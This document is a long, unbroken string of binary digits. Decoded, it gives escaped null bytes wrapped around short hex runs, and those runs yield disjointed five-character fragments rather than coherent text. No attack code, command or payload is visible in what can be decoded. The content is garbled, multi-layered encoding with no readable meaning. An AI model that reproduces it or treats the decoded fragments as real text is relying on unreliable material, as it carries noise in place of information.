010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101110011001100110110001101010011001000110000001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001000110000001101100110010000110110001101010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000011001000110110001100010011011001100101001101100011011100110010011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000110100001101100110000100110110011001100011011001100101001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110010011000001100001001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001100100011000000110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101110011100100110011011000010011011001100110001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011001100101001100100011100000110010001101110011001001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110111001101000011011001100110001101110011001000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110111001101100011010100110010011001100011011100110011001101100011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100110011011000110001001101110011001000110110001101000011001100110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110011000110010011001010011011000110110001101100011001000110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110100001101100011000100110111001101000011001000110111001100100110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011011100110111001100100011011100110010001110010011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011011100110111001100100011011000111001001101110011010000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000111000001101100110010000110110011000110011001001100010001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011000110011011001100101001100100011011100110010011000100011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011011100110010011000100011001000110111001101010110001100110110011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100110001000110111001100110011011100110100001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011011001100101001101100110011000110010001110010011001000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110011011000010011011100110000001101100011000100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001100000110000100110010001100000011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011001100011001101110011001100110110001101010011001101100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110111001100100011011100111001001100110110000100110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110000001101100011010100110110011001010011001000111000001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001100011011100110011001101110011010000110110011001100011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001101110011011000110101001100100110011000110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001100100110011000110010011001010011011000110110001101100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011011000110100001101100011000100110111001101000011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110001100110010001101110011011100110111001100100011011100110010001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001101110011011100110111001100100011011000111001001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001000111000001101100110010000110110011000110011001001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110101011000110011011001100101001100100011011100110010011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110000001101110011011100110010011000100011001000110111001101010110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011001000111000001101100110010100110110011001100011001000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110110001101010011011100111000001101100011001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110000001101110011010000110011011000010011011100110000001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011011100110011001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110111001101000011001000110000001100100011001000110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101010110001000110010011000010011010101100100001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011100111000001101100011100100110111001101000011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110110001101110011001001100101001100100110010100110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001100100110010100110010011001010011001001100101001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100100011000001100001001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110111001110010011011100110011001100100110010100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100111000001101100011100100110111001101000011001000111000001100110011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110010011000001100001001100000110000100110110001101000011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011011000110010001100000011011100110011001101100011010100110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100011001100110110001110000011001000111000001100100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011011000010011000001100001001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110010011000110011011001100101001101100110011000110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011001000110000001101100011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011100110010001100100011000000110111001100000011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110010001100000011011000111001001101100110010100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011001000110110001101000011011100110011001100110110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110010001100000011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110111001101000011011000110001001101100011001100110110011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000111000001101110011000000110110001100010011011100110011001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011000110101001101110011000000110110011000110011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110001101010011001000111000001100100011001000110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001100100011001000110010011000110011001000110010001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011001100101001101100110011000110010011000100011001101100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011000100110000011000010011000001100001001100000110000100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110100001101100011010100110110001101100011001000110000001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110000011011000110101001101100011001100110110011000100011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100100110011011000010011000001100001001100000110000100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011011000110111001101100110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000110010001101100011000100110110011000110011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001000110111001100100011000001100001001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110110001101110011011001100011001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011000110001001101100110001100110010001100000011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001101000011011100110011001100000110000100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011001000110110001101000011001001100011001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001101100100001100100011000000110110011001000011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110110000100110110001101010011001001100101001101000011001000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011011100110111001100110011011000110101001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011001000111001001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011001100110110011000010011001000110000001100110110010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101100110001100110110001110010011011000110010001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100011000110011010100110111001101010011000000110100001100110011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110011000100011011000111001001101100011010100110100011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101110011001000110010001110000011001000111001001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011011000110101001101110011010000110101011001100011011000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110011001010011011000110100001101100110001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100110001101110011001000110110011001100011011000110010001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110011001100100011100000110100001101100011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110111001100110011011000110101001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100110001101100011010100110111001100010011011100110101001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101100011001000111000001101010011010000110111001100100011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110010001110010011000001100001001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110010001101110011001000110010011001010011011100110011001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011010101100110001101100011100000110110001100010011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110110011000110011011000110101001101010110011000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101100011011000110110001101010011011100110010001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011001000111000001101010011010000110111001100100011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110110001101000011011000111001001101110011001000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101110011010000110010001110000011010100110100001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101010011011000110101001100100011100100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110110001100100011011100110010001100100110010100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011010000110101011001100011011000110011001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100010001101100011100100110110001101010011011001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110111001100100011001000111000001101100011001100110110011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001100100110010100110111001100110011011000110101001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011001100011011000111000001101100011000100110110011001010011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110110001101010011010101100110001101110011001000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110110001101110011001000110110001101010011011100110011001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011011001100100001101100011010100110110001100110011011000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110011001010011011000111001001101110110000100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001101010110011000110110001110000011011100110100001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011001001100101001101000011100000110101001101000011010100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010011000000110101001100100011011000110101001101100011011000110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011001100110110001110000011010100110000001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000110011001101100011010100110111001100110011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011001000111000001100100011100100110010011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100110010000110110001100010011011100111000001101010110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011000111001001101100110010000110110001101010011001101100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011000100110010001110010011000001100001001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011001000110101011000110011011001100101001101010110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000010011010101100100001100100011000000110100001101010011011100111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110111001101000011011000111001001101100110010100110110001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100011000100110110011001000011001000110000001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001010011010101100011001101100110010100110010001100100011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011011100110100001101110011001000110111001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100001001101100110011000110111001100000011011000110101001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011100110100001101100011010100110010001110000011011001100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110111001101000011011100110010001100100011100000110110011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001100100011100100110010001110010011000001100001001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011100110100001100110110000100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001000110010011000010011010101100100001100100011000000110100011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100110010100110110001101010011011001100010001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011001000110000001101000011100000110110001100010011011000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110111001100110011001000110000001100100110010100110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011001000110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011100111001001100110110000100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110110011000110011011000111001001101110011001100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100110110010000110010001100000011011001100110001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011001100101001100100011100000110111001100000011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110110011000110011011000111001001101110011001100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100011001100100011000000110010001100100011011100110010001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110000001100100011000000110010001100000011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001101000011011100110011001100100011000000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001101110011001000110110001101010011011000110001001101100011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000110011011000111001001101100110010100110110001101010011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001000110010001100000011001101100100001100100011000000110011001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011011100110111001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011001100011001101100011010100110010001100000011011001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110011011000110011001000110000001101100110001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001100100011100000110111001100000011011000110001001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011001000111001001100110110000100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001101000011011100110011001101010110001000110110011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100100001100100011000000110011011001000011001000110000001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011001000011001001100101001101110011001100110111001101000011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110111001100000011001000111000001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100010001100100011000000110010011000100011001101100100001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001100010011000001100001001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011000000110111001101000011001000110000001101000011100100110100011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000110101001101110011001000110111001100100011011001100110001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110010001101010110001100110110011001010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110111001100100011011001100110001101110011001000110011011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100011001100110110001110000011011000110101001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000100011001000110000001101110011100100110110011001100011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110010001100000011011100110000001101100011000100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101110011000000110110001100010011011100110100001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011010101100011001101100110010100110010001100100011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110100011000100011011000110101001101110011100100110110001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100011000100110111001100100011011000110100001101000011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011011100110100001101100011010100110111001100100011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010100110111001100000011011100110100001100110110000100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100011001101100110010100110010001100000011010101100010001100100110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011001000011001000110000001101000011010100110111001110000011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110110001110010011011001100101001101100011011100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110000001101110011001000110110011001100011011000110111001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011001100100001100100011000000110010011001010011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001100110110011001010011001000110010001100000110000100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011000000110111001101000011001101100001001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011100110011001101110011001100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011011100110011001101110011100100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001101100011010100110111001110000011011000111001001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011001100110001001100100011100100110000011000010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001110010011011001100101001101110011010000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110010001101010110001100110110011001010011010101100010001100100110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011001000011001000110000001101000110001000110110011001100011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110110011000100011011100110011001101100011100100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000111000001101100011000100110110001100100011011000111001001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001001100101001100100110010100110010001100000011001000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011001000110000001100100011000000110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101110011010000110010001110000011001100110001001100100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110010001101110011100100110011011000010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110110011001010011011100110100001100100011000000110100001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000111000001101010011010000110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001000110000001101010011011100110010011000100011001000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110101011000100011001001100001001101010110010000110010001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000110001001101100011001100110110001100110011011001100110001101110011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000100011001000110000001100110110000100110010001100100011001001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000110011000110010011000100011001000110010001100100011000000110010001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110011001100100011001000110010001100000011001000110101001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011011000110101001101100110010000110110001100010011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110010001110010011001001100010001101010011011100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100110010100110111001101000011001000110000001101010011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011001000110010001100100011000000110101011000100011001001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110010000110010001100100011001001100010001101000011001100110010011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110010001100100011000000110100011000110011011001100110001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101000011011000110101001101100011010000110010001100000011001101100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011001000110010001100000011001001100011001100100011000000110100011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100011001101100011010100110110011001010011001000111000001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011000110100001101110011001100110010001110010011001000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110001100110100001100110011001001100010001100100011000000110010001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011001000110110001101000011011100110011001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011010100110111001100000110000100110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110110011001010011011000110111001100100110001100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110000001101100110001100110110001101010011011000110001001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001000110000001101110011011100110110001100010011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110010001100000011001001100101001100100110010100110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110010001100100110001000110101001101110011000001100001001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100110011011000110101001101110011000000110111001101000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000110001000110110001101010011011100111001001101100011001000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101110011001000110110001101000011010000111001001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011000110101001101110011001000110111001100100011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110100001101010011011100111000001101100011100100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100110010100110110001101110011001000110000001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011001100110001101100011011100110111001100100011011000110001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010000110010001100000011001001100101001100100110010100110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001100100011001000110000011000010011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110010001100100011100000110110011001010011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001110000011011000111001001101110011010000110010001110000111